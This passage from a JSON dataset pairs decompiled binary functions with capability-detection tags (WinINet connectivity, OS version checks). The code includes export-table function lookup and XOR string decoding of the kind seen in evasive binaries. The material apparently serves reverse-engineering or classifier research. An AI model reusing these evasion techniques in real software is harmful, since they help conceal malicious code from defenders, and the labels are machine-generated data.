     iVar8 = -1;\n            uStack432 = 0;\n            iVar7 = iVar8;\n            pcVar5 = puVar4 + 1;\n            do {\n                if (iVar7 == 0) break;\n                iVar7 = iVar7 + -1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            uVar6 = fcn.00064834(arg1, &puStack440, puVar4 + 1, ~iVar7);\n            if (uVar6 != 0) {\n                fcn.00027a4c(1, 0, uVar6, 0);\n                return uVar6;\n            }\n            if (acStack296[0] != '\\0') {\n                pcVar5 = acStack296;\n                do {\n                    if (iVar8 == 0) break;\n                    iVar8 = iVar8 + -1;\n                    cVar1 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n                iVar8 = ~iVar8 + 1;\n                pcVar5 = fcn.00030c98(iVar8);\n                if (pcVar5 == NULL) {\n                    fcn.000649a4(arg1, 0);\n                    return 0x21590004;\n                }\n                pcVar9 = acStack296;\n                do {\n                    cVar1 = *pcVar9;\n                    pcVar9[pcVar5 - acStack296] = cVar1;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar1 != '\\0');\n                pcVar5[iVar8 + -1] = '\\0';\n                cVar1 = *pcVar5;\n                pcVar9 = pcVar5;\n                while (cVar1 != '\\0') {\n                    if (*pcVar9 == ',') {\n                        *pcVar9 = '\\0';\n                    }\n                    pcVar9 = pcVar9 + 1;\n                    cVar1 = *pcVar9;\n                }\n                uVar6 = fcn.00064abc(*arg1, pcVar5, 0);\n                if (uVar6 != 0) {\n                    fcn.00030d24(pcVar5);\n                    fcn.000649a4(arg1, 0);\n                    fcn.00027a4c(1, 0, uVar6, 0);\n                    return uVar6;\n                }\n                fcn.00030d24(pcVar5);\n            }\n            if (arg3 != NULL) {\n                *arg3 = iVar3 + 1000000000;\n            }\n            return 0;\n        }\n    }\n    return 0x21590064;\n}\n",
        "token_count": 1043
    },
    "00024244": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00024244(void)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint64_t arg4;\n    uint64_t uVar10;\n    uint64_t arg4_00;\n    uint32_t uStackX8;\n    uint32_t uStackX16;\n    int32_t aiStackX24 [2];\n    uint32_t auStackX32 [2];\n    uint auStack264 [2];\n    int64_t iStack256;\n    ulong uStack248;\n    uint32_t auStack240 [2];\n    uint32_t uStack232;\n    uint32_t uStack228;\n    uchar uStack224;\n    uint32_t uStack219;\n    uint32_t uStack211;\n    uint uStack207;\n    uint32_t uStack203;\n    uint8_t uStack199;\n    uint32_t uStack198;\n    int32_t iStack194;\n    uint uStack190;\n    uint uStack186;\n    uchar auStack136 [4];\n    uint32_t uStack132;\n    uint32_t uStack124;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    \n    uVar10 = 0;\n    uStackX16 = 0;\n    auStack264[0] = 0;\n    *0x8e758 = 0;\n    do {\n        iStack256 = 0;\n        bVar1 = false;\n        fcn.0006677c();\n        uVar4 = fcn.0002748c(1, 0);\n        fcn.0002748c(400, 20000);\n        uVar5 = fcn.0002748c(0xe1, 0x1000);\n        uVar6 = fcn.0002748c(0xe2, 0x10000);\n        uStack199 = 1;\n        iVar7 = fcn.0002748c(2, 0);\n        arg4 = 0;\n        uStack203 = iVar7 + 1;\n        arg4_00 = 0;\n        while (iVar7 = fcn.00022168(uVar4, 0, 0, auStack136),  iVar7 == 0) {\n            if (uStack88 < uStack92) {\n                arg4 = uStack124;\n                uStack199 = 0;\n                iStack194 = uStack92 - uStack88;\n                uStack198 = uStack88;\n                bVar1 = true;\n                uStack203 = uStack124;\n                arg4_00 = uStack88;\n                uVar10 = uStack92;\n                uStackX16 = uStack132;\n                break;\n            }\n            fcn.00023c98(uVar4, uStack132, uStack92, uStack124);\n        }\n        iVar7 = arg4_00;\n        if ((*0x8e758 == 0) && (iVar8 = fcn.00024014(0x8e758, 0, auStack264),  iVar8 != 0)) goto code_r0x0002470c;\n        uStack199 = uStack199 | 0x1a;\n        uStack228 = uVar4 | 0x80000000;\n        uStack224 = 1;\n        uStack207 = 0;\n        uStack211 = uVar4;\n        uStack190 = uVar5;\n        uStack186 = uVar6;\n        uStack232 = fcn.00030dc8(uStack232);\n        uStack228 = fcn.00030dc8(uStack228);\n        uStack219 = fcn.00030dc8(uStack219);\n        fcn.000250dc(&uStack211);\n        uVar9 = fcn.00064d28(*0x8e758, 0xb, &uStack232, 0x52);\n        if (uVar9 != 0) {\n            fcn.00027a4c(2, 0, uVar9, 0);\n            goto code_r0x0002470c;\n        }\n        iVar8 = fcn.00064db0(*0x8e758, uStackX8, &iStack256, auStack240);\n        if (iVar8 == 0) {\n            if (auStack240[0] < 0x40) {\n                uVar10 = 0x215901f5;\ncode_r0x000246cb:\n                fcn.00027a4c(2, 0, uVar10, 0);\n            }\n            else {\n                fcn.00025160(iStack256);\n                if (*(iStack256 + 0x2c) <= *(iStack256 + 0x30)) {\n                    if (!bVar1) {\n                        arg4 = *(iStack256 + 0xc);\n                        uVar10 = *(iStack256 + 0x2c);\n                        iVar7 = fcn.0002272c(uVar4, 0, *(iStack256 + 0xc), uVar10);\n                        if (iVar7 != 0) {\n                            uVar10 = iVar7 + 0x191U | 0x21590000;\n                            goto code_r0x000246cb;\n                        }\n                    }\n                    while( true ) {\n                        iVar7 = arg4_00;\n                        uVar9 = fcn.00064db0(*0x8e758, uStackX8, &uStack248, aiStackX24);\n                        if (uVar9 != 0) break;\n                        if (aiStackX24[0] == 0) goto code_r0x00024570;\n                        iVar8 = fcn.000221c8(uVar4, 0, uStackX16, arg4_00);\n                        fcn.00064a1c(*0x8e758, uStack248);\n                        if (iVar8 != 0) break;\n                        arg4_00 = iVar7 + aiStackX24[0];\n                    }\n                    fcn.00027a4c(2, 0, uVar9, 0);\n                    goto code_r0x00024570;\n                }\n            }\n            fcn.00064f84(*0x8e758, uStackX8);\n            goto code_r0x0002470c;\n        }\ncode_r0x00024570:\n        bVar2 = false;\n        bVar3 = false;\n        uVar9 = fcn.00064ecc(*0x8e758, uStackX8, auStackX32, &uStack248);\n        if (uVar9 == 0) {\n            if (auStackX32[0] == 0) {\n                if (iVar7 == uVar10) {\n                    fcn.00023c98(uVar4, uStackX16, uVar10, arg4);\n                    bVar2 = true;\n                }\n                else {\n                    fcn.00027a4c(2, 0, 0x215901f6, 0);\n                    fcn.0002225c(uVar4, 0, uStackX16);\n                }\n            }\n            else {\n                bVar2 = bVar3;\n                if (auStackX32[0] == 0x21590196) {\n                    if (bVar1) {\n                        fcn.0002225c(uVar4, 0, uStackX16);\n                        fcn.00027a4c(2, 0, auStackX32[0], 0);\n                        if (auStackX32[0] != 0x21590196) goto code_r0x00024650;\n                    }\n                }\n                else {\ncode_r0x00024650:\n                    if (auStackX32[0] != 0x21590192) {\n                        fcn.00027a4c(2, 0, auStackX32[0], 0);\n                    }\n                }\n            }\n            fcn.00064a1c(*0x8e758, uStack248);\n        }\n        else {\n            fcn.00027a4c(2, 0, uVar9, 0);\n        }\n        fcn.00064a1c(*0x8e758, iStack256);\n        iStack256 = 0;\n        if (!bVar2) {\ncode_r0x0002470c:\n            if (*0x8e758 != 0) {\n                fcn.00064a1c(*0x8e758, iStack256);\n                fcn.000649a4(0x8e758, 0);\n            }\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1927
    },
    "00024de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00024de0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t auStackX8 [2];\n    int64_t iStackX16;\n    int64_t aiStackX24 [2];\n    \n    iStackX16 = 0;\n    iVar1 = fcn.00022138(0xffffffff, 1, auStackX8, aiStackX24);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n        if (auStackX8[0] != 0) {\n            do {\n                uVar3 = 0;\n                do {\n                    iVar1 = fcn.00024744(&iStackX16, uVar2 * 0x40 + aiStackX24[0]);\n                    if (iVar1 != 0) break;\n                    uVar3 = uVar3 + 1;\n                } while (uVar3 < 3);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < auStackX8[0]);\n        }\n        fcn.000207c4(aiStackX24[0]);\n        if (iStackX16 != 0) {\n            fcn.000649a4(&iStackX16, 0);\n        }\n    }\n    else {\n        fcn.00027a4c(4, 0, iVar1 + 0x191U | 0x21590000, 0);\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "000251f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000251f0(void)\n\n{\n    int64_t arg1;\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    fcn.0002fcb8(0x7ec38);\n    fcn.00032748(0x7ec50, 0);\n    fcn.00032710(0x7ec50);\n    fcn.0002fc94(0x7ec38);\n    if (*0x7ec48 != 0) {\n        fcn.00030310(0x7ec40);\n        iVar1 = 0;\n        iVar2 = 0x14;\n        iVar3 = 0;\n        arg1 = *0x7ec48;\n        do {\n            if (*(iVar1 + arg1) != 0) {\n                fcn.000649a4(arg1 + iVar3, 0);\n                arg1 = *0x7ec48;\n            }\n            iVar3 = iVar3 + 0x1a8;\n            iVar1 = iVar1 + 0x1a8;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        fcn.00030d24(arg1);\n        *0x7ec48 = iVar2;\n        fcn.00030378(0x7ec40);\n    }\n    if (*0x7ec40 != 0) {\n        fcn.00030d24(*0x7ec40);\n        *0x7ec40 = 0;\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "00025cdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00025cdc(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t aiStackX8 [4];\n    \n    if ((arg1 != 0) && (*0x7ec48 != NULL)) {\n        aiStackX8[0] = arg1;\n        fcn.00030310(0x7ec40);\n        iVar5 = 0;\n        iVar3 = 0;\n        piVar2 = *0x7ec48;\n        do {\n            if (*piVar2 == 0) {\n                iVar4 = iVar5;\n                piVar2 = *0x7ec48 + iVar4 * 0x35 + 1;\n                (*0x7ec48)[iVar4 * 0x35] = aiStackX8[0];\n                fcn.0006670a(piVar2, arg2, 0x195);\n                iVar3 = *0xfffff78000000320;\n                uVar1 = (**0x11308)();\n                *(*0x7ec48 + iVar4 * 0x35 + 0x34) = (iVar3 * uVar1) / 10000;\n                aiStackX8[0] = 0;\n                break;\n            }\n            iVar3 = iVar3 + 1;\n            iVar5 = iVar5 + 1;\n            piVar2 = piVar2 + 0x35;\n        } while (iVar3 < 0x14);\n        fcn.00030378(0x7ec40);\n        if (aiStackX8[0] != 0) {\n            fcn.000649a4(aiStackX8, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 404
    },
    "00026cdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00026cdc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    ulong arg1_00;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uint32_t *arg3_00;\n    uint32_t uVar4;\n    ulong arg2_00;\n    uint64_t arg2_01;\n    uint64_t uVar5;\n    ulong *arg1_01;\n    ulong uStackX24;\n    uint32_t auStackX32 [2];\n    ulong *in_stack_00000028;\n    uint *in_stack_00000030;\n    int64_t in_stack_00000038;\n    ulong *in_stack_00000040;\n    ulong uStack88;\n    uint64_t uStack80;\n    \n    uVar5 = 0;\n    uVar3 = arg4;\n    arg2_01 = arg2;\n    uStack88 = 0;\n    uStackX24 = arg3;\n    auStackX32[0] = arg4;\n    if ((99 < arg2) && (*(in_stack_00000038 + 8) != '\\x04')) {\n        uVar3 = fcn.00025ac8(&uStackX24, auStackX32, &uStack88);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = auStackX32[0];\n    }\n    arg1_00 = uStack88;\n    uVar1 = *(in_stack_00000038 + 8);\n    if (uVar1 == 0) {\ncode_r0x00026f65:\n        uVar3 = 0;\n        uVar5 = 0x21590001;\n        uVar4 = 5;\n        arg2_00 = 0x21590001;\ncode_r0x00026f73:\n        fcn.00027a4c(uVar4, arg2_00, uVar3, arg2_01);\n        *in_stack_00000028 = 0;\n    }\n    else {\n        if (uVar1 < 3) {\n            if (in_stack_00000040 == NULL) {\n                uVar4 = fcn.000252a8(arg1, arg2_01, uStackX24, uVar3);\n                uVar5 = uVar4;\n                fcn.00027a4c(5, uVar4, 0, arg2_01);\n                goto code_r0x00026f97;\n            }\n        }\n        else if (uVar1 != 3) {\n            if (uVar1 != 4) goto code_r0x00026f65;\n            if ((((0x18 < *(in_stack_00000038 + 9)) || (0x3b < *(in_stack_00000038 + 10))) ||\n                (*(in_stack_00000038 + 0xd) == 0)) || (*(in_stack_00000038 + 0xb) == '\\0')) {\n                return 0x21590065;\n            }\n            uStack80 = arg2;\n            uStack88 = CONCAT44(*(in_stack_00000038 + 0xd), \n                                CONCAT21(CONCAT11(*(in_stack_00000038 + 9), *(in_stack_00000038 + 10)), \n                                         *(in_stack_00000038 + 0xb)));\n            iVar2 = fcn.000226e8(0xfffffffe, 6, *(in_stack_00000038 + 4), uStackX24);\n            if (iVar2 == 0) {\n                fcn.0002fcb8(0x8e728);\n            }\n            else {\n                uVar5 = iVar2 + 0x191U | 0x21590000;\n            }\n            arg2_00 = 0;\n            uVar4 = 7;\n            uVar3 = uVar5;\n            goto code_r0x00026f73;\n        }\n        arg3_00 = fcn.00030c98(uVar3 + 0x10);\n        if (arg3_00 == NULL) {\n            fcn.00027a4c(5, 0, 0x21590004, arg2_01);\n            return 0x21590004;\n        }\n        *arg3_00 = arg2;\n        arg3_00[2] = *(in_stack_00000038 + 4);\n        uVar1 = *(in_stack_00000038 + 8);\n        arg3_00[3] = uVar3;\n        arg3_00[1] = uVar1;\n        fcn.0006670a();\n        if (*(in_stack_00000038 + 8) == '\\x03') {\n            fcn.00027a4c(0xc, 0, 0, arg2_01);\n        }\n        arg1_01 = &uStack88;\n        if (in_stack_00000040 != NULL) {\n            arg1_01 = in_stack_00000040;\n        }\n        iVar2 = fcn.0001a9b0(arg1_01, 0x2637c, arg3_00);\n        if (iVar2 == 0) {\n            if (in_stack_00000040 == NULL) {\n                fcn.00032710(arg1_01);\n                uVar5 = 0;\n            }\n        }\n        else {\n            uVar4 = fcn.00030eb8();\n            uVar5 = uVar4;\n            fcn.00030d24(arg3_00);\n            fcn.00027a4c(5, 0, uVar4, arg2_01);\n        }\n        *in_stack_00000028 = 0;\n    }\n    *in_stack_00000030 = 0;\ncode_r0x00026f97:\n    fcn.00030d24(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 1309
    },
    "000270f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000270f4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t arg3_00;\n    int64_t arg3_01;\n    ulong arg1_00;\n    uint32_t uStackX8;\n    uint32_t auStackX16 [6];\n    uint32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    uchar auStack136 [16];\n    uchar auStack120 [4];\n    uint32_t uStack116;\n    uint32_t uStack72;\n    \n    arg1_00 = 0xfffffffe;\n    auStackX16[0] = arg2;\n    if (arg1 == 3) {\n        uVar2 = fcn.00027030(auStack136, 0x10);\n        if (uVar2 != 0) {\n            if (uVar2 != 5) {\n                return uVar2;\n            }\n            goto code_r0x00027140;\n        }\n        arg1_00 = 0xfffffffd;\n    }\n    else {\ncode_r0x00027140:\n        uVar2 = fcn.00026fb4(auStack136, 0x10, 0x229);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n    }\n    if (in_stack_00000030 == 0) {\n        uVar2 = fcn.00022168(arg1_00, arg1, auStackX16, auStack120);\n    }\n    else {\n        uVar2 = fcn.00022198(arg1_00, arg1, auStackX16[0], auStack120);\n    }\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    arg3_00 = fcn.00030c98(uStack72);\n    if (arg3_00 == 0) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.0002220c(arg1_00, arg1, uStack116, 0);\n    uVar2 = uVar1;\n    if (uVar1 != 0) goto code_r0x0002729f;\n    uVar1 = fcn.000201e8(auStack136, 0x10, arg3_00, uStackX8);\n    if (uVar1 == 0xffffffff) {\ncode_r0x00027205:\n        uVar2 = 0xffffffff;\n    }\n    else {\n        if (arg4 < uVar1) {\n            if (arg4 == 0) {\n                *in_stack_00000028 = uVar1;\n            }\n            else {\n                arg3_01 = fcn.00030c98(uVar1);\n                if (arg3_01 == 0) goto code_r0x00027205;\n                fcn.00020210(auStack136, 0x10, arg3_01, arg3_00);\n                fcn.0006670a(arg3, arg3_01, arg4);\n                *in_stack_00000028 = arg4;\n                fcn.00030d24(arg3_01);\n            }\n        }\n        else {\n            fcn.00020210(auStack136, 0x10, arg3, arg3_00);\n            *in_stack_00000028 = uVar1;\n        }\n        uVar2 = 0;\n    }\ncode_r0x0002729f:\n    fcn.00030d24(arg3_00);\n    fcn.00030d24(0);\n    return uVar2;\n}\n",
        "token_count": 815
    },
    "000272c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000272c0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t arg3_00;\n    ulong arg1_00;\n    uint32_t auStackX16 [6];\n    int32_t in_stack_00000030;\n    uchar auStack120 [16];\n    uchar auStack104 [4];\n    uint32_t uStack100;\n    uint32_t uStack60;\n    \n    arg1_00 = 0xfffffffe;\n    auStackX16[0] = arg2;\n    if (arg1 == 3) {\n        uVar3 = fcn.00027030(auStack120, 0x10);\n        if (uVar3 != 0) {\n            if (uVar3 != 5) {\n                return uVar3;\n            }\n            goto code_r0x00027304;\n        }\n        arg1_00 = 0xfffffffd;\n    }\n    else {\ncode_r0x00027304:\n        uVar3 = fcn.00026fb4(auStack120, 0x10, 0x229);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n    }\n    uVar1 = fcn.00020328(auStack120, 0x10, arg4);\n    arg3_00 = fcn.00030c98(uVar1);\n    if (arg3_00 == 0) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.00020130(auStack120, 0x10, arg3_00, arg3);\n    if (in_stack_00000030 != 0) {\n        iVar2 = fcn.00022168(arg1_00, arg1, auStackX16, auStack104);\n        if (iVar2 == 0) {\n            if (uVar1 <= uStack60) {\n                uVar1 = fcn.000222f0(arg1_00, arg1, uStack100);\n                if (uVar1 == 0) {\n                    uVar1 = fcn.000221c8(arg1_00, arg1, uStack100, 0);\n                }\n                goto code_r0x000273fe;\n            }\n            fcn.0002225c(arg1_00, arg1, uStack100);\n        }\n    }\n    uVar1 = fcn.000226e8(arg1_00, arg1, auStackX16[0], arg3_00);\ncode_r0x000273fe:\n    fcn.00030d24(arg3_00);\n    return uVar1;\n}\n",
        "token_count": 604
    },
    "0004e130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0004e130(int64_t arg1, char *arg2, int64_t *arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int64_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    uint16_t uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    uint16_t *puVar11;\n    uint32_t *puVar12;\n    int64_t iVar13;\n    uint32_t uVar14;\n    uint32_t uStackX8;\n    \n    if (arg1 == 0) {\n        uVar4 = 0x21590066;\n    }\n    else if (arg2 == NULL) {\n        uVar4 = 0x21590067;\n    }\n    else if (arg3 == NULL) {\n        uVar4 = 0x21590068;\n    }\n    else {\n        iVar5 = *(arg1 + 0x3c) + arg1;\n        if (*(iVar5 + 0x18) == 0x10b) {\n            puVar6 = iVar5 + 0x78;\n        }\n        else {\n            puVar6 = iVar5 + 0x88;\n        }\n        uVar2 = *puVar6;\n        if (uVar2 != 0) {\n            iVar5 = arg1 + uVar2;\n            iVar13 = *(iVar5 + 0x1c) + arg1;\n            puVar11 = *(iVar5 + 0x24) + arg1;\n            puVar12 = *(iVar5 + 0x20) + arg1;\n            if ((arg2 & 0xffffffffffff0000) != 0) {\n                iVar7 = -1;\n                uStackX8 = 0;\n                pcVar9 = arg2;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar1 = *pcVar9;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar1 != '\\0');\n                uVar14 = ~iVar7 - 1;\n                if (*(iVar5 + 0x18) == 0) {\n                    return 0x21590005;\n                }\n                do {\n                    uVar3 = *(iVar13 + *puVar11 * 4);\n                    if ((uVar14 < (puVar6[1] + uVar2) - *puVar12) && (*(uVar14 + *puVar12 + arg1) == '\\0')) {\n                        uVar10 = 0;\n                        if (uVar14 == 0) goto joined_r0x0004e2a5;\n                        pcVar9 = arg2;\n                        do {\n                            if (pcVar9[(*puVar12 + arg1) - arg2] != *pcVar9) break;\n                            uVar10 = uVar10 + 1;\n                            pcVar9 = pcVar9 + 1;\n                        } while (uVar10 < uVar14);\n                        if (uVar14 <= uVar10) goto joined_r0x0004e2a5;\n                    }\n                    uStackX8 = uStackX8 + 1;\n                    puVar11 = puVar11 + 1;\n                    puVar12 = puVar12 + 1;\n                    if (*(iVar5 + 0x18) <= uStackX8) {\n                        return 0x21590005;\n                    }\n                } while( true );\n            }\n            uVar8 = arg2 - *(iVar5 + 0x10);\n            if (uVar8 < *(iVar5 + 0x14) || uVar8 == *(iVar5 + 0x14)) {\n                uVar3 = *(iVar13 + uVar8 * 4);\njoined_r0x0004e2a5:\n                if ((uVar2 <= uVar3) && (uVar3 < puVar6[1] + uVar2)) {\n                    uVar4 = fcn.0004d7dc(uVar3 + arg1, arg3);\n                    return uVar4;\n                }\n                *arg3 = arg1 + uVar3;\n                return 0;\n            }\n        }\n        uVar4 = 0x21590005;\n    }\n    return uVar4;\n}\n",
        "token_count": 959
    },
    "00027840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00027840(int64_t arg1)\n\n{\n    if (((arg1 != 0) && (*(arg1 + 8) != 0)) && (*(arg1 + 0x130) != 0)) {\n        fcn.00051ffc(*(arg1 + 0x134), *(arg1 + 8));\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "000284dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000284dc(void)\n\n{\n    ulong *arg1;\n    \n    while( true ) {\n        fcn.00032284(0x7edb0);\n        arg1 = **0x7edd0;\n        if (arg1 == NULL) break;\n        **0x7edd0 = *arg1;\n        fcn.00032304(0x7edb0);\n        if (arg1[0x24] != NULL) {\n            (*arg1[0x24])();\n        }\n        fcn.00027840(arg1);\n        fcn.00030d24(arg1);\n    }\n    fcn.00032304(0x7edb0);\n    fcn.00032284(0x7edb0);\n    *0x7edc8 = arg1;\n    **0x7edd0 = 0;\n    *0x7edd0 = arg1;\n    fcn.00032304(0x7edb0);\n    fcn.00032148(0x7edb0);\n    if (*0x8e928 != *0x7edd8) {\n        fcn.0001612c(*0x8e928, 0x8ea48);\n    }\n    if (*0x7ec68 != 0) {\n        fcn.00032284(0x8e740);\n        fcn.00027840(0x7ec60);\n        *0x7ec68 = 0;\n        *0x7edf0 = 0;\n        *0x7edf8 = 0;\n        fcn.00032304(0x8e740);\n    }\n    if (*0x8e750 != 0) {\n        fcn.00030d24(*0x8e750);\n    }\n    *0x8e740 = 0;\n    *0x8e748 = 0;\n    *0x8e750 = 0;\n    return;\n}\n",
        "token_count": 424
    },
    "00028b0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00028b0c(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uchar auStack312 [16];\n    char acStack296 [272];\n    \n    bVar1 = false;\n    iVar2 = fcn.00027418(0x22c, acStack296, 0x104, auStack312);\n    if (iVar2 == 0) {\n        fcn.00032284(0x8e740);\n        bVar1 = true;\n        if (*0x7ec68 != 0) {\n            fcn.00027840(0x7ec60);\n            *0x7edf0 = 0;\n            *0x7edf8 = 0;\n        }\n        if (acStack296[0] == '&') {\n            iVar2 = fcn.0002792c(acStack296, 0x7ec60);\n        }\n        else {\n            iVar2 = fcn.000278a0(0x7ec60, acStack296);\n        }\n        if (((iVar2 == 0) && (iVar2 = fcn.00027834(0x7ec60, 0x11f70, 0x7edf0),  iVar2 == 0)) &&\n           (iVar2 = fcn.00027834(0x7ec60, 0x11f60, 0x7edf8),  iVar2 == 0)) {\n            fcn.0001612c(*0x7ec68, 0x7ed88);\n            goto code_r0x00028b65;\n        }\n    }\n    else {\n        iVar2 = 0x21590065;\n    }\n    *0x7edf0 = 0;\n    *0x7edf8 = 0;\n    fcn.00027840(0x7ec60);\n    if (!bVar1) {\n        return iVar2;\n    }\ncode_r0x00028b65:\n    fcn.00032304(0x8e740);\n    return iVar2;\n}\n",
        "token_count": 455
    },
    "00028d7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028d7c(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    \n    if (*0x697ef != '\\0') {\n        pcVar1 = \"shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}\";\n        iVar2 = 0x40;\n        do {\n            *pcVar1 = *pcVar1 ^ pcVar1[-0x40];\n            pcVar1 = pcVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00066722(arg1, arg2, 0x11f88);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 190
    },
    "00028dd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
